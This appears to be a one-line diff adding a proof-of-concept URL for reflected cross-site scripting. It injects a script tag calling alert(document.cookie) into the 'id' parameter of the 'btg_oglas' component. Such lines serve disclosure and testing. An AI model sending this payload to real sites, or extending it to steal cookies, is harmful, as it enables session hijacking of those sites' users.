@@ -1,0 +1,1 @@
+http://www.example.com/[path]/index.php?option=btg_oglas&amp;id=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
